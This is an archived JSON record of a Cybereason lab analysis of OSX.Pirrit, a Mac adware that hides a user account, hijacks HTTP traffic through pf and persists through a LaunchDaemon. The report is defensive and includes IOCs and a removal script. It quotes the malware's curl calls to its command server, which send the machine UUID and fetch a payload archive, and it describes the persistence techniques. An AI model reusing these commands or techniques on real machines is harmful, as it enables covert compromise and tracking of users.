{
    "id": "d82fc3d3-5a25-4b7d-b118-7209dd106001",
    "created_at": "2022-10-25T16:48:24.06564Z",
    "updated_at": "2025-03-27T02:08:40.336032Z",
    "deleted_at": null,
    "sha1_hash": "5ef40759fa2c8926398115faa9f5febc341c76fe",
    "title": "",
    "authors": "",
    "file_creation_date": "2016-04-06T14:29:47Z",
    "file_modification_date": "2016-04-06T14:29:47Z",
    "file_size": 5867208,
    "plain_text": "### Lab Analysis\n\n# OSX Pirrit:\n\n## What adware that “just” displays ads\n means for Mac OS X security\n\n#### Amit Serper Lead OS X and Linux security researcher\n\n www.cybereason.com\n\n\n-----\n\nI remember adware being a really big buzzword at the beginning of the last decade. Windows\nmachines were being bombarded with popups, popunders, toolbars and other annoying ways to\nplant advertisements in your browser. Back then, I was a teenager running Windows and refused to\ninstall anti-spyware and anti-adware software because there was a rumor that those applications\nwere, in fact, adware themselves! I created my own workaround by running ‘msconfig’, going through\nall of the startup items and removing anything that looked weird. That method almost always\nworked!\n\nFast forward to today–I’m no longer a teenager, and now I make my living by leading Cybereason’s\nsecurity research on Mac OS X and Linux (while ever so often pitching in with the Windows effort,\ntoo). I spend a lot of time looking at new, interesting and, from time to time, nasty malware.\n\nLast Wednesday night, I came across a piece of adware targeting OS X that fell into the category of\ninteresting. Let’s be clear – I’m not about to drop zero-days. Instead, I’m going to dissect the adware\n(or at least the more interesting parts of it) to give you an inside look on the lengths attackers are\ngoing through to develop threats that target Macs.\n\nI’d also like to draw attention to the fact that malware targeting Macs exists. While this program only\ndelivers ads to a browser, it does use social engineering to get privilege escalation and eventually\ntake total control of your machine. And with control of your machine, attackers could have done\nmore than bombard you with ads.\n\nI was checking out the OS X reverse engineering IRC channel (#osxre@freenode) when a user with\nthe name “Xiano” popped in and asked for help figuring out what was going on with his friend’s Mac.\nXiano said the machine was acting weird and really slow to connect to the Internet. When he sniffed\nthe traffic using tcpdump he saw there was a lot of traffic on the network interface even when the\ncomputer was idle. He also saw some weird named processes running under a username that the\nMac’s owner did not know or add.\n\nXiano said that he was a Linux guy with very little OS X knowledge. But, since OS X’s terminal is very\nsimilar to Linux’s he started looking at process lists using “ps” and open handles using “lsof”\nand filled a zip file with anything that looked fishy. He then uploaded one zip file with a Mach-O\nexecutable and shared the link on the channel. One of the people in the chatroom, “Paraxor,”\ndownloaded the file, opened it with a disassembler and shared a few function names in the channel:\n\nAs you can see, the names of the functions clearly indicated that this application is some sort of\nadware. But it had another interesting component that immediately caught my eye, it was using\n_QString class, which is a part of the Qt cross platform development framework. This caught my_\nattention because these function names combined with the fact that a cross-platform SDK was used\nmeant that whatever this adware did, it was probably doing it on Windows before.\n\nNow, I was interested.\n\n\n-----\n\nI downloaded the files that Xiano had posted. The file was, in fact, an app bundle called\n“sizzling.app.” First I navigated to the Contents/MacOS directory inside the app bundle to\nexamine what was in there. I was actually expecting to find a single executable file, but instead I was\ngreeted with two files: rec_script.sh (a shellscript) and sizzling (an unsigned Mach-O x64\nexecutable file).\n\nLooking at shell scripts is always easier than looking at binary files. When looking at\n```\nrec_script.sh we can see that is a relatively easy to read shellscript that even starts with a\n\n```\ncomment “set redirections.” The comment is then followed by populating a variable called\n`$HIDDEN_USER` with the value of the user_id tag from a plist file that is located in\n```\n/Library/Preferences/com.common.plist\n\n```\nThis script figures out the active network interface (be it the wireless or physical ethernet NIC) by\nparsing the output of the route get command. After finding out which interface is the active one,\nthe script is routing all of the HTTP traffic on port 80 to an HTTP proxy running locally on port 9882\n\n\n-----\n\n(127.0.0.1:9882). We can then see that it applies another rule: “pass out proto tcp all user\n```\n$HIDDEN_USER”, which means that the previous rule does not apply if traffic is generated by\n$HIDDEN_USER. \n\n```\nWait, routing all the traffic through a proxy? A hidden user? This looks really nasty, much nastier than\nI expected adware to look. At this point $HIDDEN_USER and com.common.plist are unknown and\na bit obscured details–this will be clearer soon.\n\nAfter figuring out the the script’s purpose, it was time to look at the binary itself. The easiest thing to\ndo would be to look at the string table:\n\nThe string table reveals an interesting finding, A Windows registry key inside a Mach-O executable.\nWTF?\n\nAs we can see, the key is “HKEY_LOCAL_MACHINE\\SOFTWARE\\Pirrit.” A quick Google search\nwith the string “Pirrit” revealed that “Pirrit” is Windows adware.\n\n\n-----\n\n_Screenshot from Microsoft malware protection website_\n\nIt was then clear that this was an OS X port of Pirrit. It was at that point that I tweeted that I was\nlooking at a poorly made OS X adware. I thought it was poorly made because it was written in Qt and\nhad some Windows related strings left in it. But since I had yet to run it inside an isolated VM, I didn’t\nreally know exactly what it would do or how it would work. Also, let’s not forget that I had the app\nbundle of an already installed OS X variant of Pirrit (which from now and on will be referred to as\n“OSX.Pirrit”) that was given to me by Xiano. I did not have any information about how this bundle\nwas installed on Xiano’s friend’s computer. Basically, I was looking at what was eventually installed\nand not at the installer.\n\n\n-----\n\nI continued going through the executable’s string table and following URLs in it:\n\n1. http://thecloudservices.net\n\nWhen I accessed this URL with a browser, I ended up getting a blank, white page. I thought I\nwas missing something so I even tried loading the URL with Python:\n\nBut as you can see, the page is indeed empty.\n\n2. `http://shorte.st/st/2904deaf2db062b776f39f499bf88ad9/%1`\n\n`Shorte.st` is a link shortening service that displays ads to the users who visit the\nshortened links. When I visited that link I got a 404 error and used Google to search for the\nURL. This gave me one result; a sandbox report from May 2014 of what seems to be “Pirrit\nsuggestor for Windows.” That URL was also in the binary’s string table.\n\n3. http://thecloudservices.net/static/pd_files/ok.html\n\nLoading that URL with Python shows that it just contains the string “OK.” Probably expects\nthis string as part of a connection check routine.\n\n4. http://www.google.com   - The world’s most powerful search engine :) Probably another\n\nconnection check routine.\n\nWhen I executed this binary (sizzling) I got a bunch of Qt related error messages and that’s it.\nNothing really worked. Also, there was nothing related to any unknown or hidden usernames other\nthan that $HIDDEN_USERNAME variable from the script mentioned before.\n\nI was just about to call it a night when Xiano messaged me that he had managed to get some more\nfiles from his friend’s machine, including another app bundle. I suspected that this app bundle was\ncopied to the machine from a dmg image of a fake installer, probably Flash. The second bundle was\nnamed “DemoUpdater.”\nNavigating to the bundle’s Contents/MacOS directory revealed another unsigned executable x64\nMach-O binary called “DemoUpdater.” DemoUpdater’s string table looked far more interesting than\nsizzling’s. It had some obfuscated and packed looking strings. Looking at the file with a\n\n\n-----\n\ndisassembler revealed that some decrypting functions are meant to decrypt the domains that\n```\nosx.pirrit connects to.\n\n```\nThe domains that I’ve managed to extract so far are mentioned at the bottom of this document.\n\nThere were also other encrypted strings that according to their symbol names are related to the\nWindows variant:\n\n\n-----\n\nThe executable then executes the update2.sh script that is also inside the MacOS directory.\nUpdate2.sh is a very long (330 lines!) shell script that even executes some inline python code\n**(python -c) that basically prepares all of the infrastructure for osx.pirrit. It starts by creating a**\nfile in /var/tmp/updText.txt that file contains the output of many functions from the script.\n\n`Update2.sh` is a very long script but here are its notable actions:\n\n1. The script gets the machine id (uuid) derived from the actual uuid of the machine by running\n\nthe ioreg -rdl -c IOPlatformExpertDevice command and parsing its output using\n_awk and grep._\n`2.` It then sends the machine ID to a server in order to get a new ID back from the server by\n\nexecuting a curl command line ```\n   curl.\"http://93a555685cc7443a8e1034efa1f18924.com/v/cld?mid=<UUID>&c\n   t=pd\"\n\n```\n3. The script then checks the country code of the machine its running on by visiting\n```\n   ‘ipinfo.io/country’ using curl. The ipinfo.io service returns the current\n\n```\ncountry code in ISO 3166-2 format. If the country code that was returned from the website\nwas for the U.S., U.K., Spain, Australia, France, Germany, India, Italy, Netherlands or New\nZealand, it will replace the browser’s homepage and search engine with trovi.com, a known\nsketchy advertising service. If the country is not on the list, the homepage and search\nprovider will be replaced with search-quick.com, another known sketchy advertising service.\n4. After installation is complete, the script also updates its C&C and notifies it that the\n\ninstallation was successful. It does that by running curl with the following URL:\n```\n   \"http://93a555685cc7443a8e1034efa1f18924.com/pd/update   effect?mid=<UUID>&st=1”\n\n```\n5. The script will then configure Safari, Chrome and Firefox, if installed to use these search\n\nproviders.\n6. After all of the configurations are made, the script will download a tgz archive that contains\n\n**the actual ad injecting proxy and click jacker in an app bundle and a few installation and**\nconfiguration scripts (including an uninstall script) from the following URL:\n_\"http://93a555685cc7443a8e1034efa1f18924.com/static/pd_files/dit3.tgz\" and will extract it_\nto /tmp/DemoInjector07122015. This may say that the version is either from December\nor July of 2015.\n7. After the file was downloaded and extracted to the aforementioned directory, the script will\n\ninstall the adware and clickjacker by running a script called “install_injector” that was\nextracted from the archive to /tmp/DemoInjector07122015.\n\nNow, after the archive was extracted, and “./install_injector” was executed osx.pirrit\nwill be persistently installed.\n\nThe Install_injector.sh shell script is 111 lines long and handles setting up the persistence by\nestablishing an autorun, setting up an HTTP proxy to inject ads, adding a hidden user and hijacking\nall of the user’s HTTP traffic on port 80 to the ad injecting proxy.\nTo hide itself and make it harder to detect, the install script generates company, product and\nusernames. The generated product name will be used for the binary name of the ad injecting proxy,\n\n\n-----\n\nthe generated company name will be used for the autorun plist and the generated username will be\nused for the hidden username that will execute the proxy.\n\nIn order to generate the username, product and company names the script selects a random word\nfrom the /usr/share/dict/words file, note that a different word will be selected for each name.\nRemember “sizzling” from earlier? It was generated this way.\n\nAfter the random names are generated, the script will create a new user with the generated\nusername. The user’s home directory will be in /var/<username> and its UID will be set to 401\n(hardcoded).\n\nThe details of the generated user will be saved inside\n```\n/Library/Preferences/com.common.plist.\n\n```\nThe password for the that user is hardcoded inside the script file and it is “test.”\nThe script also sets read, write and execute permissions on\n```\n/Library/<companyname>/Contents/MacOS/<companyname>, which is where the ad\n\n```\ninjecting proxy is located.\n\nIn order to hide the newly created user from the log-in and configuration screens, the script turns on\nthe Hide500Users property in /Library/Preferences/com.apple.loginwindow. Setting this\n\n\n-----\n\nflag to True (or Yes in this case) will hide any user that has a lower uid than 500 from any\nconfiguration or log-in screens\n\nAs we can see in these screenshots, the only username that’s being displayed is “test,” which is the\nuser that ‘owns’ this machine. The hidden random username that was generated on my machine\nwas “ununiformity” and as you can see, it is not shown in the user configuration or the log-in screen.\n\nAfter taking care of user hiding, the script will setup pf (OS X’s built-in packet filter) to filter all of the\nHTTP traffic on port 80 and forward it through the proxy in order to inject ads and track the user’s\ntraffic.\n\n\n-----\n\nThe use of pf for this task also makes it hard for the average user to disable or even understand\nwhere all the ads are coming from since pf is doing all of the packet forwarding legwork. The\nWindows variant of Pirrit simply adds the proxy server to the browser’s configuration, evidence that\ncan be clearly seen.\n\nNote that only the traffic that belongs to the hidden user will not be forwarded through the proxy.\nThis avoids redirection-loops since the hidden user is the one that is running the proxy server.\nAlso note the creation of the file /etc/pf_proxy.conf, which will contain those pf rules. These\nrules will be loaded every time the machine reboots.\n\nThe script will now add a LaunchDaemon (autorun in Mac speak) to /Library/LaunchDaemons.\n\nThe plist file of the LaunchDaemon will be called com.<randomCompanyName>.net```\npreferences.plist.\n\n```\nAs we can see in this plist, the launch agent will run the /etc/change_net_settings.sh, a script\nthat was also created by the installer script.\n\n\n-----\n\nThis logic can be also be witnessed when looking at /etc/change_net_settings.sh\n\nAlthough osx.pirrit has root permissions (since the LaunchDaemon is running as root) it is\nrunning the ad injecting proxy as the hidden user by issuing a sudo -u command, which can also be\nseen in a ps output:\n\nNow, the ad injector proxy is finally running and ads are being injected!\n\n\n-----\n\nAfter figuring the entire installer out, we need to go back to the beginning.“Sizzling” was the ad\ninjecting proxy and the name sizzling was generated. I still don’t have the complete installer app\nbundle since I had to assemble it from the bits and pieces that Xiano sent me. My best guess is that\nthe installer is just a drive-by download masked as a generic update. For example, the installer could\nbe concealed as a Flash update that, once executed, prompts the user to enter his password,\nelevating its privileges to root, assuming that the user is in the sudoers list (which in most cases he\nis). Looking for the file’s hash in VirusTotal reveals that it indeed had several update related names.\n\nNote the “Upd” appended to the end of each file name.\n\n\n-----\n\n**CONCLUSION**\nIs osx.pirrit a groundbreaking threat? Of course not. Is it using any vulnerabilities in OS X? It\ndoesn’t look like it. While it wasn’t an elaborate piece of malware, osx.pirrit took complete\ncontrol of the machine while making it very hard for the user to remove it. And if it wasn’t for the tons\nof popup ad windows and ads being injected to webpages, the vast majority of users wouldn’t even\nknow it was there. It has no configuration screen or an entry in the /Applications directory and\nthe only way to see that it is actually running (other than wondering where are all of those ads\ncoming from) is to look at the running process list and examine it closely.\n\nBut this doesn’t mean osx.pirrit should be dismissed as completely harmless because it “only”\ndisplays ads. The greater point I’m trying to make is that malware targets Macs. While there’s hardly\nany malware research out there for Macs because, well, there isn’t much malware that targets Macs,\nthis doesn’t mean Macs are somehow immune to threats.\n```\nOsx.pirrit gives attackers persistence over your machine. Instead of spamming you with ads,\n\n```\nthey could have just as easily stolen data or taken your company’s secret sauce. Or they could have\ninstalled a keylogger to capture your log-in information, allowing them access to your bank account.\n\nIn this case, attackers didn’t exploit a vulnerability. They used basic social engineering and a simple\n(but very long) script to carry out this attack. You have to know what’s happening on your machines\n(even Macs) because the moment you don’t pay attention you end up getting compromised.\n\n**IOCS**\n\n  - A user with the uid of 401, can be checked by issuing the following commands:\n\n`o` Can be checked by running “dscl . -list /Users UniqueID | grep 401\"\n\n  - The /Library/Preferences/com.common.plist file\n\n  - The `/etc/pf_proxy.conf file`\n\n  - The /Library/<companyname>/ Directory\n\n  - The /etc/change_net_settings.sh file\n\n  - Connections to/from the following domains:\n\n`o` *.93a555685cc7443a8e1034efa1f18924.com\n`o` *.trkitok.com\n`o` *.aa625d84f1587749c1ab011d6f269f7d64.com\n`o` *.2ff328dcee054f2f9a9a5d7e966e3ec0.com\n`o` *.aae219721390264a73aa60a5e6ab6ccc4e.com\n`o` Search-quick.com\n`o` Trovi.com\n\n  - Hashes (md5):\n\n`o` 85846678ad4dbff608f2e51bb0589a16 - installer\n`o` 70772fccaec011be535d1f41212f755f - proxy\n\n**REMOVAL**\nRemediation script can be downloaded from my GitHub:\nhttps://github.com/aserper/osx.pirrit_removal/blob/master/remove_pirrit.sh\nIf you are infected, please download this script and run it as root (sudo).\n\n\n-----\n\n#### About the Author\n\n Amit Serper\n\n###### Lead Linux and Mac OS X Security Researcher Cybereason\n\n Follow Amit on Twitter: @0xAmit\n\n At Cybereason, Amit leads Mac OS X and Linux security research. He specializes in low-level, vulnerability and kernel research, malware analysis and reverse engineering. He also has extensive experience studying attack simulations on large scale networks and researching undocumented OS resources and APIs.\n\n Prior to joining Cybereason, Amit spent nine years leading security projects for the Israeli government, specifically in embedded system security.\n\nCybereason was founded in 2012 by a team of ex-military cyber security experts to revolutionize detection and\nresponse to cyber attacks. The Cybereason Malop Hunting Engine identifies signature and non-signature based\nattacks using big data, behavioral analytics, and machine learning. The Incident Response console provides\nsecurity teams with an at-your-fingertip view of the complete attack story, including the attack’s timeline, root cause,\nadversarial activity and tools, inbound and outbound communication used by the hackers, as well as affected\nendpoints and users. This eliminates the need for manual investigation and radically reduces response time\nfor security teams. The platform is available as an on premise solution or a cloud-based service. Cybereason is\nprivately held and headquartered in Boston, MA with offices in Tel Aviv, Israel.\n\n© All Rights Reserved. Cybereason 2016\n\n##### 2\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "99fdc3ef-333d-48f5-a4a1-becd788c7b80",
            "created_at": "2022-10-25T15:28:29.802983Z",
            "updated_at": "2022-10-25T15:28:29.802983Z",
            "deleted_at": null,
            "name": "MITRE",
            "url": "https://github.com/mitre-attack/attack-stix-data",
            "description": "MITRE ATT&CK STIX Data",
            "reports": null
        }
    ],
    "references": [
        "https://cdn2.hubspot.net/hubfs/3354902/Content%20PDFs/Cybereason-Lab-Analysis-OSX-Pirrit-4-6-16.pdf"
    ],
    "report_names": [
        "Cybereason-Lab-Analysis-OSX-Pirrit-4-6-16.pdf"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716504,
    "ts_updated_at": 1743041320,
    "ts_creation_date": 1459952987,
    "ts_modification_date": 1459952987,
    "files": {
        "pdf": "https://archive.orkl.eu/5ef40759fa2c8926398115faa9f5febc341c76fe.pdf",
        "text": "https://archive.orkl.eu/5ef40759fa2c8926398115faa9f5febc341c76fe.txt",
        "img": "https://archive.orkl.eu/5ef40759fa2c8926398115faa9f5febc341c76fe.jpg"
    }
}